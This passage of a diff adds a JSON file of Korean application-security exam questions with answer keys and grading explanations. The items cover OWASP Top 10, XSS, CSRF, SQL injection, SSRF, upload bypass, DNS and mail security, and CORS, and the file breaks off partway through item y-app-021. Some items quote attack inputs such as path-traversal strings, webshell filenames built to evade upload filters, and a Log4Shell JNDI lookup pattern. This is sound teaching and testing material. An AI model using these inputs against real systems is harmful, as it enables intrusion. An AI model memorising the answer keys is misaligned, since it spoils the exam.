@@ -1,0 +1,420 @@
+{
+  "domain": "애플리케이션보안",
+  "items": [
+    {
+      "id": "y-app-001",
+      "type": "단답형",
+      "question": "OWASP Top 10(2021) 항목에 대한 물음이다.\n\n* 1위 ( A ) : 사용자가 권한 밖의 자원·기능에 접근(수평·수직 권한 상승, IDOR).\n* 2위 ( B ) : 약한 암호화·평문 저장·취약한 알고리즘 등 민감 데이터 보호 실패.\n* 3위 Injection : SQL·OS 명령·LDAP 등 인터프리터에 신뢰할 수 없는 데이터 전달.",
+      "answer": "정답\n(A) Broken Access Control (취약한 접근 통제)\n(B) Cryptographic Failures (암호화 실패, 구 Sensitive Data Exposure)",
+      "explanation": "2021 순위: A01 접근통제 → A02 암호화 실패 → A03 인젝션 → A04 안전하지 않은 설계 → A05 보안 설정 오류 → A06 취약·오래된 컴포넌트 → A07 식별·인증 실패 → A08 SW·데이터 무결성 실패 → A09 로깅·모니터링 실패 → A10 SSRF.",
+      "notes": [
+        "애플리케이션보안/owasp-top10과-시큐어-sdlc"
+      ],
+      "tags": [
+        "OWASP",
+        "접근통제",
+        "암호화실패"
+      ]
+    },
+    {
+      "id": "y-app-002",
+      "type": "단답형",
+      "question": "XSS(Cross-Site Scripting) 유형에 대한 물음이다.\n\n* 게시판·댓글처럼 악성 스크립트가 서버 DB 에 저장되어 열람자 모두에게 실행되는 유형은 ( A ) XSS 이다.\n* URL 파라미터의 값이 응답 페이지에 그대로 반사되어 피싱 링크 클릭 시 실행되는 유형은 ( B ) XSS 이다.\n* 서버를 거치지 않고 클라이언트 측 JavaScript(document.location 등)가 DOM 을 조작하며 발생하는 유형은 ( C ) XSS 이다.",
+      "answer": "정답\n(A) Stored(저장형, Persistent) XSS\n(B) Reflected(반사형, Non-persistent) XSS\n(C) DOM 기반 XSS",
+      "explanation": "대응: 출력 시 컨텍스트별 인코딩(HTML entity, JS, URL, CSS), 입력 검증(허용 목록), CSP(Content-Security-Policy) 헤더, HttpOnly 쿠키(스크립트의 쿠키 접근 차단), 프레임워크의 자동 이스케이프 활용. DOM XSS 는 서버 필터링으로 못 막으므로 클라이언트 sink 검토 필수.",
+      "notes": [
+        "애플리케이션보안/xss-csrf"
+      ],
+      "tags": [
+        "XSS",
+        "저장형",
+        "반사형",
+        "DOM",
+        "CSP"
+      ]
+    },
+    {
+      "id": "y-app-003",
+      "type": "단답형",
+      "question": "CSRF(Cross-Site Request Forgery)에 대한 물음이다.\n\n* CSRF 공격이 성립하는 전제는, 피해자의 브라우저가 인증된 ( A )를 요청에 자동으로 포함시켜 전송한다는 점이다.\n* CSRF 를 막기 위해 서버가 폼에 예측 불가한 임의 값을 삽입하고 요청 시 검증하는 방어책은 ( B ) 이다.\n* 쿠키가 서드파티(cross-site) 요청에 전송되지 않도록 하는 쿠키 속성은 ( C ) 이다.",
+      "answer": "정답\n(A) 세션 쿠키(인증 정보)\n(B) CSRF 토큰 (Synchronizer Token / Anti-CSRF Token)\n(C) SameSite (Strict 또는 Lax)",
+      "explanation": "CSRF 는 피해자 권한으로 '상태를 변경하는' 요청(비밀번호 변경, 송금)을 위조. 방어: CSRF 토큰, SameSite 쿠키, Referer/Origin 헤더 검증, 중요 작업 재인증. XSS 와 달리 응답을 읽지는 못한다(CSRF ≠ 정보 유출).",
+      "notes": [
+        "애플리케이션보안/xss-csrf"
+      ],
+      "tags": [
+        "CSRF",
+        "토큰",
+        "SameSite",
+        "Origin검증"
+      ]
+    },
+    {
+      "id": "y-app-004",
+      "type": "단답형",
+      "question": "SQL 인젝션 세부 기법에 대한 물음이다.\n\n* 응답에 데이터가 직접 표시되지 않고 참·거짓에 따른 페이지 반응 차이만으로 데이터를 한 비트씩 알아내는 기법은 ( A ) 이다.\n* SLEEP()·BENCHMARK() 등으로 응답 지연을 유발해 조건의 참·거짓을 판별하는 기법은 ( B ) 이다.\n* DB 오류 메시지에 쿼리 결과를 노출시켜 추출하는 기법은 ( C ) 이다.",
+      "answer": "정답\n(A) Blind SQL Injection (Boolean 기반)\n(B) Time-based Blind SQL Injection\n(C) Error-based SQL Injection",
+      "explanation": "기타: UNION 기반(컬럼 수·타입 일치 시 결과 병합), Out-of-band(DNS/HTTP 로 데이터 유출), 2nd-order(저장 후 다른 지점에서 실행), Stacked Query(`;` 로 다중 쿼리). 근본 방어는 Prepared Statement(파라미터 바인딩).",
+      "notes": [
+        "애플리케이션보안/sql-injection"
+      ],
+      "tags": [
+        "SQLi",
+        "Blind",
+        "Timebased",
+        "Errorbased"
+      ]
+    },
+    {
+      "id": "y-app-005",
+      "type": "단답형",
+      "question": "다음 설명에 해당하는 웹 공격을 쓰시오.\n\n* (A) : 서버가 사용자 입력으로 지정한 URL·리소스를 대신 요청하게 만들어, 내부망(169.254.169.254 메타데이터, localhost)에 접근하거나 스캔하는 공격.\n* (B) : 요청 파라미터로 파일 경로를 받는 기능에 `../` 를 넣어 웹 루트 밖의 파일(`/etc/passwd` 등)을 읽는 공격.",
+      "answer": "정답\n(A) SSRF (Server-Side Request Forgery)\n(B) 경로 조작 / 디렉터리 트래버설(Path Traversal, LFI)",
+      "explanation": "- SSRF: 클라우드 메타데이터 서비스(IMDSv1) 탈취로 임시 자격증명 획득이 대표 피해. 대응: 요청 대상 도메인/IP 허용 목록, 내부 대역 차단, 리다이렉트 비허용, IMDSv2.\n- Path Traversal: 입력 정규화 후 canonical path 가 허용 디렉터리 내인지 검증, `../` 필터링(우회 인코딩 주의), chroot.",
+      "notes": [
+        "애플리케이션보안/인젝션-웹셸-요청위조-스머글링",
+        "애플리케이션보안/robots-모바일앱-클라우드-보안"
+      ],
+      "tags": [
+        "SSRF",
+        "PathTraversal",
+        "LFI",
+        "메타데이터"
+      ]
+    },
+    {
+      "id": "y-app-006",
+      "type": "단답형",
+      "question": "파일 업로드 취약점에 대한 물음이다.\n\n* 공격자가 서버에서 실행 가능한 스크립트 파일(.php, .jsp 등)을 업로드해 원격 명령을 실행하는 백도어를 ( A ) 이라 한다.\n* 확장자 검사만 하는 필터를 우회하기 위해 `shell.php.jpg`, `shell.pHp`, 널바이트(`shell.php%00.jpg`) 등을 시도하는 것을 ( B ) 이라 한다.",
+      "answer": "정답\n(A) 웹셸(WebShell)\n(B) 확장자 우회(파일 업로드 필터 우회)",
+      "explanation": "대응: 업로드 파일은 웹 루트 밖·실행 권한 없는 별도 스토리지에 저장, 파일명 난수화, 확장자 '허용 목록', MIME/매직바이트 검증, 이미지 재인코딩, 업로드 디렉터리 스크립트 실행 비활성(`php_admin_flag engine off`, Handler 제거), 안티바이러스 스캔.",
+      "notes": [
+        "애플리케이션보안/파일업로드-취약점",
+        "애플리케이션보안/인젝션-웹셸-요청위조-스머글링"
+      ],
+      "tags": [
+        "파일업로드",
+        "웹셸",
+        "확장자우회"
+      ]
+    },
+    {
+      "id": "y-app-007",
+      "type": "단답형",
+      "question": "다음은 Apache 웹서버의 `httpd.conf` 보안 설정이다. 각 지시자가 수행하는 보안 기능을 쓰시오.\n\n* `ServerTokens Prod` : ( A )\n* `ServerSignature Off` : ( B )\n* `Options -Indexes` : ( C )\n* `TraceEnable Off` : ( D )",
+      "answer": "정답\n(A) 응답 Server 헤더에 Apache 버전·OS 정보 노출 최소화(제품명만 표시)\n(B) 오류 페이지 하단의 서버 버전 서명(signature) 제거\n(C) 디렉터리 인덱스(자동 파일 목록) 표시 비활성 → 디렉터리 리스팅 차단\n(D) HTTP TRACE 메서드 비활성 → Cross-Site Tracing(XST) 공격 방지",
+      "explanation": "추가 하드닝: 불필요 모듈 비활성, `LimitRequestBody`, `AllowOverride None`, 사용자 홈 `UserDir disabled`, 에러 로그·액세스 로그 분리 보관, `.ht*` 접근 차단, mod_security(WAF). 실행 계정은 nobody/apache 전용(비특권).",
+      "notes": [
+        "애플리케이션보안/아파치-웹서버-보안설정과-로그"
+      ],
+      "tags": [
+        "Apache",
+        "httpd.conf",
+        "디렉터리리스팅",
+        "TRACE"
+      ]
+    },
+    {
+      "id": "y-app-008",
+      "type": "단답형",
+      "question": "메일 보안 인증 기술에 대한 물음이다.\n\n* 발신 도메인이 어떤 IP 에서 메일을 보낼 수 있는지 DNS TXT 레코드로 공표하는 기술은 ( A ) 이다.\n* 발신 서버가 메일 헤더·본문에 개인키로 전자서명을 하고, 수신 서버가 DNS 의 공개키로 검증하는 기술은 ( B ) 이다.\n* (A)·(B) 검증 실패 시 처리 정책(none/quarantine/reject)과 리포트 수신을 지정하는 상위 정책은 ( C ) 이다.",
+      "answer": "정답\n(A) SPF (Sender Policy Framework)\n(B) DKIM (DomainKeys Identified Mail)\n(C) DMARC (Domain-based Message Authentication, Reporting & Conformance)",
+      "explanation": "SPF 는 Envelope-From(MAIL FROM) 기준, DKIM 은 서명 무결성, DMARC 는 헤더 From 도메인과 SPF/DKIM 도메인의 'alignment' 확인 + 실패 정책 + 집계/포렌식 리포트. 셋을 함께 적용해야 스푸핑·피싱 방어. BIMI 는 인증된 발신자의 로고 표시.",
+      "notes": [
+        "애플리케이션보안/메일보안-spf-dkim-dmarc"
+      ],
+      "tags": [
+        "SPF",
+        "DKIM",
+        "DMARC",
+        "메일스푸핑"
+      ]
+    },
+    {
+      "id": "y-app-009",
+      "type": "단답형",
+      "question": "DNS 보안에 대한 물음이다.\n\n* DNS 응답 데이터에 전자서명(RRSIG)을 추가해 위·변조와 캐시 포이즈닝을 방지하는 확장은 ( A ) 이다.\n* 로컬 DNS 캐시 서버에 위조 응답을 먼저 주입해 잘못된 IP 를 캐싱시키는 공격은 ( B ) 이다.\n* 클라이언트-리졸버 구간 DNS 질의를 HTTPS/TLS 로 암호화하는 기술은 각각 ( C ), ( D ) 이다.",
+      "answer": "정답\n(A) DNSSEC\n(B) DNS 캐시 포이즈닝(캐시 스푸핑) / Kaminsky 공격\n(C) DoH (DNS over HTTPS)\n(D) DoT (DNS over TLS)",
+      "explanation": "캐시 포이즈닝 대응: 소스 포트 랜덤화 + 트랜잭션 ID 랜덤화(Kaminsky 완화), DNSSEC(무결성·출처 인증, 기밀성 아님), 재귀 질의 제한. DoH/DoT 는 도청·조작 방지(기밀성). 존 전송(AXFR)은 secondary 로만 제한(`allow-transfer`).",
+      "notes": [
+        "애플리케이션보안/dns-보안"
+      ],
+      "tags": [
+        "DNSSEC",
+        "캐시포이즈닝",
+        "DoH",
+        "DoT"
+      ]
+    },
+    {
+      "id": "y-app-010",
+      "type": "단답형",
+      "question": "DB 보안에 대한 물음이다.\n\n* 애플리케이션 수정 없이 DB 앞단(네트워크 또는 에이전트)에서 SQL 질의를 감시·차단·감사하는 솔루션은 ( A ) 이다.\n* 컬럼 데이터를 조회 권한에 따라 `홍**`, `123456-*******` 처럼 가려 보여주는 기법은 ( B ) 이다.\n* 저장된 데이터를 파일·디스크 수준에서 자동 암호화하여 저장매체 탈취 시 노출을 막는 DB 기능은 ( C ) 이다. (약어)",
+      "answer": "정답\n(A) DB 접근제어(DAM, Database Activity Monitoring / DB 방화벽)\n(B) 데이터 마스킹(동적/정적)\n(C) TDE (Transparent Data Encryption)",
+      "explanation": "- DAM: 계정·IP·시간·구문 기반 정책, 특권 계정(DBA) 우회 감시, 감사 로그.\n- 마스킹: 동적(조회 시점, 원본 유지) / 정적(개발·테스트용 사본 생성). 개인정보 표시제한과 연결.\n- TDE: 저장(at-rest) 암호화. 컬럼 암호화(애플리케이션/DBMS)와 구분. 키는 별도 KMS/HSM 관리.",
+      "notes": [
+        "애플리케이션보안/db보안-암호화-마스킹-감사"
+      ],
+      "tags": [
+        "DAM",
+        "DB방화벽",
+        "마스킹",
+        "TDE"
+      ]
+    },
+    {
+      "id": "y-app-011",
+      "type": "단답형",
+      "question": "다음 유명 취약점의 원인과 영향 대상을 쓰시오.\n\n* Heartbleed (CVE-2014-0160) : ( A )\n* Shellshock (CVE-2014-6271) : ( B )\n* Log4Shell (CVE-2021-44228) : ( C )",
+      "answer": "정답\n(A) OpenSSL 의 TLS Heartbeat 확장에서 길이 검증 누락(버퍼 오버리드) → 서버 메모리(개인키·세션·평문) 유출\n(B) GNU Bash 의 환경변수 함수 정의 파싱 결함 → CGI 등을 통해 원격 명령 실행\n(C) Apache Log4j2 의 JNDI 룩업 기능(`${jndi:ldap://...}`)을 로그 문자열에서 처리 → 원격 코드 실행(RCE)",
+      "explanation": "공통 교훈: 오픈소스 컴포넌트 취약점 관리(SCA, SBOM), 신속 패치, 입력이 로그·헤더·User-Agent 등 예상 못한 경로로 유입될 수 있음. Log4Shell 대응: 2.17.x 이상 업그레이드, `log4j2.formatMsgNoLookups=true`, JndiLookup 클래스 제거.",
+      "notes": [
+        "애플리케이션보안/주요-취약점-heartbleed-shellshock-log4j"
+      ],
+      "tags": [
+        "Heartbleed",
+        "Shellshock",
+        "Log4Shell",
+        "CVE"
+      ]
+    },
+    {
+      "id": "y-app-012",
+      "type": "단답형",
+      "question": "전자상거래·결제 보안에 대한 물음이다.\n\n* 카드 소지자 데이터를 저장·처리·전송하는 모든 기관이 준수해야 하는 국제 보안 표준은 ( A ) 이다. (약어)\n* 카드 결제 시 카드번호를 무의미한 대체값으로 바꿔 가맹점이 실제 카드번호를 보관하지 않게 하는 기술은 ( B ) 이다.\n* 온라인 카드 결제에서 발급사가 추가 인증(생체·OTP)을 수행하는 프로토콜의 최신 버전은 ( C ) 이다.",
+      "answer": "정답\n(A) PCI DSS (Payment Card Industry Data Security Standard)\n(B) 토큰화(Tokenization)\n(C) 3-D Secure 2.0 (EMV 3DS)",
+      "explanation": "PCI DSS 12개 요구사항(방화벽·기본값 변경·저장 데이터 보호·전송 암호화·안티바이러스·시큐어 개발·접근통제·고유 ID·물리보안·모니터링·테스트·정책). 카드번호(PAN)는 저장 시 강력 암호화, CVV/CVC·PIN·트랙 데이터는 인증 후 저장 금지.",
+      "notes": [
+        "애플리케이션보안/전자상거래-보안"
+      ],
+      "tags": [
+        "PCIDSS",
+        "토큰화",
+        "3DSecure",
+        "결제보안"
+      ]
+    },
+    {
+      "id": "y-app-013",
+      "type": "서술형",
+      "question": "SQL 인젝션과 OS 명령어 인젝션(Command Injection)의 공통 원인과 차이점을 설명하고, 두 취약점을 모두 방지하기 위한 공통 원칙과 각각의 구체적 대응책을 서술하시오.",
+      "answer": "정답\n[공통 원인] 신뢰할 수 없는 사용자 입력을 코드/명령/쿼리에 '문자열 결합'으로 삽입하여, 데이터가 인터프리터에 의해 '구문'으로 해석되기 때문이다(코드와 데이터의 미분리).\n\n[차이점]\n- SQL 인젝션: 대상 인터프리터가 DBMS. 데이터 조회·변조·인증 우회·DB 서버 명령 실행이 목표.\n- OS 명령어 인젝션: 대상이 셸(system(), exec(), popen() 등). `; & | \\`\\` $()` 등 셸 메타문자로 임의 OS 명령을 실행하여 서버 완전 장악이 가능해 더 치명적일 수 있다.\n\n[공통 원칙]\n- 입력을 신뢰하지 않고 허용 목록(whitelist) 기반으로 검증.\n- 코드와 데이터 분리(파라미터화).\n- 최소 권한(DB 계정·프로세스 계정).\n- 오류 메시지 최소화·심층 방어(WAF).\n\n[대응책]\n- SQL: Prepared Statement/파라미터 바인딩, 저장 프로시저, ORM, 이스케이프(보조), DB 계정 권한 최소화.\n- 명령어: 가능하면 셸을 호출하지 않고 언어 내장 API 사용, 부득이하면 인자 배열 방식(`execve` 스타일)으로 셸 해석 배제, 실행 파일·인자를 허용 목록으로 고정, 셸 메타문자 차단.",
+      "explanation": "채점 포인트: 공통 원인(코드-데이터 미분리) + 차이(대상 인터프리터, 명령어 인젝션이 서버 장악) + 공통 원칙(허용목록·파라미터화·최소권한) + SQL=Prepared Statement / 명령어=셸 미사용·인자배열. 'blacklist 필터링'만은 감점.",
+      "notes": [
+        "애플리케이션보안/sql-injection",
+        "애플리케이션보안/인젝션-웹셸-요청위조-스머글링"
+      ],
+      "tags": [
+        "SQLi",
+        "CommandInjection",
+        "인젝션방어"
+      ]
+    },
+    {
+      "id": "y-app-014",
+      "type": "서술형",
+      "question": "시큐어 코딩(Secure SDLC) 관점에서, 소프트웨어 개발 생명주기의 각 단계(요구분석-설계-구현-테스트-운영)에서 수행해야 할 보안 활동을 설명하시오. 정적 분석(SAST)과 동적 분석(DAST)의 차이도 포함하시오.",
+      "answer": "정답\n1. 요구분석: 보안 요구사항 정의, 컴플라이언스(개인정보·PCI 등) 식별, 오·남용 사례(abuse case) 도출.\n2. 설계: 위협 모델링(STRIDE), 보안 아키텍처(인증·인가·암호화·로깅), 공격 표면 축소, 안전한 설계 원칙(최소권한·심층방어·안전한 기본값).\n3. 구현: 시큐어 코딩 가이드(입력검증·출력인코딩·에러처리) 준수, 코드 리뷰, SAST(정적 분석) 로 소스에서 취약 패턴 검출, SCA 로 오픈소스 취약점 점검.\n4. 테스트: DAST(동적 분석)로 실행 중 애플리케이션에 공격을 가해 취약점 탐지, 모의해킹/침투테스트, IAST, 퍼징.\n5. 운영: 보안 패치·형상 관리, WAF·모니터링, 로그·이상 탐지, 사고 대응 체계, 정기 재점검.\n\n[SAST vs DAST]\n- SAST: 소스코드/바이트코드를 실행 없이 분석. 개발 초기 적용 가능, 취약 코드 위치를 정확히 지목. 오탐 많고 런타임·설정 이슈는 못 잡음.\n- DAST: 구동 중인 시스템을 외부에서 블랙박스로 테스트. 실제 익스플로잇 가능성 확인, 환경·설정 문제 탐지. 코드 위치 특정 어렵고 커버리지가 테스트 시나리오에 의존.",
+      "explanation": "채점 포인트: 5단계별 활동(설계=위협모델링, 구현=SAST, 테스트=DAST/모의해킹) + SAST(정적·조기·위치특정·오탐) vs DAST(동적·실증·설정탐지·커버리지 한계).",
+      "notes": [
+        "애플리케이션보안/owasp-top10과-시큐어-sdlc",
+        "애플리케이션보안/웹취약점-진단도구와-테스트기법"
+      ],
+      "tags": [
+        "SecureSDLC",
+        "위협모델링",
+        "SAST",
+        "DAST"
+      ]
+    },
+    {
+      "id": "y-app-015",
+      "type": "서술형",
+      "question": "세션 관리 취약점의 유형(세션 고정, 세션 하이재킹, 세션 예측)을 설명하고, 안전한 세션 관리를 위한 대응책을 5가지 이상 서술하시오.",
+      "answer": "정답\n[유형]\n- 세션 고정(Session Fixation): 공격자가 미리 발급받은 세션 ID 를 피해자가 로그인하도록 유도해, 로그인 후 그 세션을 공격자가 그대로 사용.\n- 세션 하이재킹(Hijacking): XSS·스니핑·MITM 으로 유효한 세션 ID(쿠키)를 탈취해 피해자로 위장.\n- 세션 예측(Prediction): 세션 ID 생성 규칙(순차·시간 기반·약한 난수)을 추측해 타인 세션 ID 를 만들어냄.\n\n[대응책]\n1. 로그인 성공 시 세션 ID 재발급(session regeneration) — 세션 고정 방어.\n2. 세션 ID 는 충분히 길고 예측 불가한 CSPRNG 로 생성.\n3. 쿠키에 HttpOnly(스크립트 접근 차단), Secure(HTTPS 전용), SameSite 속성 적용.\n4. 전 구간 HTTPS 강제(HSTS) — 스니핑·MITM 방어.\n5. 세션 타임아웃(유휴·절대), 로그아웃 시 서버 세션 즉시 파기.\n6. 세션에 클라이언트 바인딩(IP·User-Agent 변경 감지), 동시 로그인 제한.\n7. 중요 기능은 재인증 요구.",
+      "explanation": "채점 포인트: 3유형 구분(고정 vs 하이재킹 혼동 주의) + 대응(로그인 시 재발급, CSPRNG, HttpOnly/Secure/SameSite, HTTPS, 타임아웃) 중 5개.",
+      "notes": [
+        "애플리케이션보안/xss-csrf",
+        "애플리케이션보안/owasp-top10과-시큐어-sdlc"
+      ],
+      "tags": [
+        "세션관리",
+        "세션고정",
+        "세션하이재킹",
+        "HttpOnly"
+      ]
+    },
+    {
+      "id": "y-app-016",
+      "type": "서술형",
+      "question": "웹 애플리케이션 방화벽(WAF)의 동작 방식(탐지 모델)과 배치 형태를 설명하고, WAF 도입 시 한계와 유의사항을 서술하시오.",
+      "answer": "정답\n[탐지 모델]\n- 부정 보안 모델(Negative/Blacklist): 알려진 공격 시그니처·패턴을 차단. 도입이 쉬우나 신종·우회에 약하고 오탐 관리 필요.\n- 긍정 보안 모델(Positive/Whitelist): 정상 요청의 구조(파라미터·길이·타입)를 학습해 그 외 차단. 강력하나 학습·튜닝 부담이 크고 애플리케이션 변경 시 갱신 필요.\n- 대개 두 모델을 혼합하고 스코어링·머신러닝을 병행.\n\n[배치 형태]\n- 인라인(리버스 프록시/브리지): 트래픽이 WAF 를 통과. 차단 가능, 단일 장애점·지연.\n- 아웃오브패스(미러링/스니핑): 탐지·경보만, 성능 영향 적음.\n- 호스트형(모듈: ModSecurity), 클라우드형(CDN 결합).\n\n[한계·유의사항]\n- HTTPS 트래픽 검사를 위해 SSL 복호화(인증서·성능 고려) 필요.\n- 로직 취약점·인증/인가 결함·비즈니스 로직 오남용은 탐지 못함(WAF 는 보완이지 대체가 아님).\n- 오탐으로 정상 서비스 차단 위험 → 초기 탐지 모드 운영 후 튜닝, 예외 정책 관리.\n- 인코딩·조각화·파라미터 오염 등 우회 기법 대비 정규화 성능 중요.\n- 근본 대응은 시큐어 코딩, WAF 는 심층 방어의 한 계층.",
+      "explanation": "채점 포인트: 부정/긍정 보안 모델 + 인라인/미러링 배치 + 한계(SSL 복호화, 로직 취약점 못 잡음, 오탐, 우회) + '시큐어 코딩 보완재'. ",
+      "notes": [
+        "애플리케이션보안/웹취약점-진단도구와-테스트기법",
+        "애플리케이션보안/owasp-top10과-시큐어-sdlc"
+      ],
+      "tags": [
+        "WAF",
+        "긍정보안모델",
+        "부정보안모델",
+        "심층방어"
+      ]
+    },
+    {
+      "id": "y-app-017",
+      "type": "서술형",
+      "question": "'HTTP 요청 스머글링(Request Smuggling)'의 발생 원리를 설명하고, 이 공격으로 발생할 수 있는 피해와 대응책을 서술하시오.",
+      "answer": "정답\n[원리]\n- 프런트엔드(프록시·로드밸런서·CDN)와 백엔드 서버가 하나의 TCP 연결로 재사용되는 HTTP 요청의 '경계'를 서로 다르게 해석할 때 발생한다.\n- 주로 `Content-Length` 와 `Transfer-Encoding: chunked` 헤더가 동시에 존재하거나 모호할 때, 한쪽은 CL 을, 다른 쪽은 TE 를 기준으로 파싱하여(CL.TE / TE.CL / TE.TE) 공격자가 심어둔 '숨은 요청' 일부가 다음 사용자의 요청 앞에 붙는다.\n\n[피해]\n- 다른 사용자의 요청·응답 탈취(자격증명), 프런트엔드 보안 통제(WAF·인증) 우회, 캐시 포이즈닝(악성 응답을 캐시에 저장), 세션 하이재킹, 내부 엔드포인트 접근.\n\n[대응책]\n- 프런트엔드-백엔드가 동일한 HTTP 파서·버전을 쓰도록 통일하고, 가능하면 HTTP/2 를 백엔드까지 종단 적용(HTTP/1.1 다운그레이드 회피).\n- 모호한 요청(CL 과 TE 동시, 중복 헤더, 비정상 chunked) 거부.\n- 프런트엔드에서 요청을 정규화하여 백엔드로 전달, 백엔드 연결 재사용 제한.\n- 최신 프록시·서버 패치, 요청 스머글링 테스트를 정기 진단 항목에 포함.",
+      "explanation": "채점 포인트: 프런트/백엔드 파싱 불일치 + CL/TE 헤더 모호성(CL.TE/TE.CL) + 피해(요청 탈취·WAF 우회·캐시 포이즈닝) + 대응(파서 통일·모호 요청 거부·정규화·패치).",
+      "notes": [
+        "애플리케이션보안/인젝션-웹셸-요청위조-스머글링"
+      ],
+      "tags": [
+        "RequestSmuggling",
+        "CL.TE",
+        "캐시포이즈닝",
+        "프록시"
+      ]
+    },
+    {
+      "id": "y-app-018",
+      "type": "서술형",
+      "question": "모바일 앱 보안 위협을 클라이언트(단말) 측 관점에서 설명하고(역공학, 무결성 훼손, 민감정보 저장 등), 각 위협에 대한 대응 기법을 서술하시오.",
+      "answer": "정답\n1. 역공학(Reverse Engineering): APK/IPA 디컴파일로 소스 로직·API 키·알고리즘 노출.\n   대응 — 코드 난독화, 문자열·리소스 암호화, 중요 로직 서버화, 하드코딩 비밀 제거.\n2. 앱 위·변조 / 재패키징: 코드를 수정해 광고 삽입·인증 우회 후 재배포.\n   대응 — 앱 무결성 검증(서명 체크섬), 서버 측 무결성 확인, 위·변조 탐지 시 실행 중단.\n3. 루팅/탈옥 단말: 샌드박스 무력화로 데이터 접근·후킹.\n   대응 — 루팅/탈옥 탐지, 탐지 시 기능 제한, SafetyNet/Play Integrity·DeviceCheck.\n4. 민감정보 로컬 저장: 평문 DB·SharedPreferences·로그에 토큰·개인정보 저장.\n   대응 — Keystore/Keychain 사용, 최소 저장·즉시 파기, 로그에 민감정보 금지.\n5. 동적 분석/후킹(Frida, Xposed): 런타임 메모리·함수 조작.\n   대응 — 디버거·후킹 탐지, 루트 탐지, 화이트박스 암호, 안티탬퍼링.\n6. 안전하지 않은 통신: 인증서 검증 미흡 → MITM.\n   대응 — TLS 강제, SSL Pinning, 클린텍스트 트래픽 비허용.\n\nOWASP MASVS/MSTG 를 기준으로 점검한다.",
+      "explanation": "채점 포인트: 역공학·재패키징·루팅·로컬저장·후킹·통신 중 4개 이상 + 각 대응(난독화, 무결성검증, 루팅탐지, Keystore, SSL Pinning). OWASP Mobile 언급 시 가점.",
+      "notes": [
+        "애플리케이션보안/robots-모바일앱-클라우드-보안"
+      ],
+      "tags": [
+        "모바일보안",
+        "역공학",
+        "SSLPinning",
+        "루팅탐지"
+      ]
+    },
+    {
+      "id": "y-app-019",
+      "type": "서술형",
+      "question": "웹사이트 정보 노출 취약점에서 `robots.txt` 와 검색엔진을 이용한 정보 수집(Google Hacking / OSINT)의 위험을 설명하고, 대응 방안을 서술하시오.",
+      "answer": "정답\n[위험]\n- `robots.txt` 는 크롤러 차단 요청 파일일 뿐 접근 통제가 아니며, 오히려 `Disallow: /admin/`, `/backup/` 처럼 숨기고 싶은 경로를 공격자에게 알려주는 '지도'가 된다.\n- Google Hacking: `site:`, `filetype:`, `inurl:`, `intitle:` 연산자로 노출된 관리자 페이지·설정 파일·백업(.bak, .sql, .zip)·로그·디렉터리 리스팅·에러 메시지·개인정보 파일을 검색할 수 있다.\n- 소스 주석, `.git`/`.svn` 디렉터리, `.DS_Store`, 스웨거·API 문서, 클라우드 스토리지 공개 버킷도 정보 노출원이다.\n\n[대응]\n- robots.txt 에 민감 경로를 나열하지 말고, 해당 경로 자체를 인증·IP 제한으로 보호.\n- 검색엔진 색인 차단은 `X-Robots-Tag`/`noindex` 메타 + 접근 통제 병행.\n- 디렉터리 리스팅 비활성, 백업·임시·버전관리(.git) 파일 웹 루트에서 제거, 소스 주석에 내부 정보 금지.\n- 상세 에러 메시지 비노출, 정기적으로 자사 도메인을 Google Hacking 쿼리로 자가 점검하고 노출 시 캐시 삭제 요청.\n- 개인정보 노출은 즉시 삭제·통지, 재발방지.",
+      "explanation": "채점 포인트: robots.txt = 통제 아님·경로 노출 / Google Hacking 연산자(filetype·inurl 등)로 백업·설정·관리자 노출 / 대응(경로 자체 보호·리스팅 비활성·.git 제거·자가점검). ",
+      "notes": [
+        "애플리케이션보안/robots-모바일앱-클라우드-보안",
+        "애플리케이션보안/아파치-웹서버-보안설정과-로그"
+      ],
+      "tags": [
+        "robots.txt",
+        "GoogleHacking",
+        "정보노출",
+        "OSINT"
+      ]
+    },
+    {
+      "id": "y-app-020",
+      "type": "서술형",
+      "question": "'CORS(Cross-Origin Resource Sharing)'의 개념과 SOP(Same-Origin Policy)와의 관계를 설명하고, CORS 설정을 잘못했을 때 발생하는 보안 문제와 안전한 설정 방법을 서술하시오.",
+      "answer": "정답\n[개념·관계]\n- SOP: 브라우저 기본 보안 정책으로, 스크립트가 자신의 출처(scheme+host+port)와 다른 출처의 응답을 읽지 못하게 한다.\n- CORS: 서버가 응답 헤더(`Access-Control-Allow-Origin` 등)로 특정 다른 출처의 접근을 '선택적으로 허용'하는 표준 메커니즘. SOP 의 예외를 안전하게 여는 것.\n- Preflight: 위험한 요청(커스텀 헤더, PUT/DELETE 등) 전에 브라우저가 OPTIONS 로 허용 여부를 먼저 확인.\n\n[잘못된 설정의 문제]\n- `Access-Control-Allow-Origin: *` 와 `Access-Control-Allow-Credentials: true` 를 함께 쓰거나(사양상 불가하지만 구현 결함), 요청 Origin 을 검증 없이 그대로 반사(reflect)하면, 악성 사이트가 피해자의 인증 쿠키로 API 를 호출해 응답(개인정보)을 읽을 수 있다.\n- `null` Origin 허용, 와일드카드 서브도메인 허용도 위험.\n\n[안전한 설정]\n- 허용 출처를 명시적 화이트리스트로 관리하고, 요청 Origin 이 목록에 있을 때만 그 값을 반환.\n- 자격증명 공유가 필요할 때만 `Allow-Credentials: true` + 구체적 Origin(와일드카드 금지).\n- 허용 메서드·헤더를 최소화, `Vary: Origin` 설정, 민감 API 는 CORS 로 열지 않음.",
+      "explanation": "채점 포인트: SOP(응답 읽기 차단) vs CORS(서버가 예외 허용) + Preflight + 잘못된 설정(Origin 반사·* + credentials)로 인증 API 응답 탈취 + 안전 설정(화이트리스트·와일드카드 금지).",
+      "notes": [
+        "애플리케이션보안/xss-csrf",
+        "애플리케이션보안/owasp-top10과-시큐어-sdlc"
+      ],
+      "tags": [
+        "CORS",
+        "SOP",
+        "Preflight",
+        "Origin검증"
+      ]
+    },
+    {
+      "id": "y-app-021",
+      "type": "실무형",
+      "question": "웹 애플리케이션 취약점 진단 중, 게시판 글 상세 페이지 `view.jsp?boardId=3&docId=1024` 에서 `docId` 값을 `1025`, `1026` 으로 바꾸자 작성 권한이 없는 다른 사용자의 비공개 글이 그대로 열람되었다.\n\n(a) 취약점의 명칭(OWASP 항목 포함)을 쓰시오.\n(b) 이 취약점의 근본 원인을 설명하시오.\n(c) 대응 방안을 3가지 이상 제시하시오.\n(d) `docId` 를 UUID 로 바꾸면 완전한 해결책이 되는지 판단하고 이유를 쓰시오.",
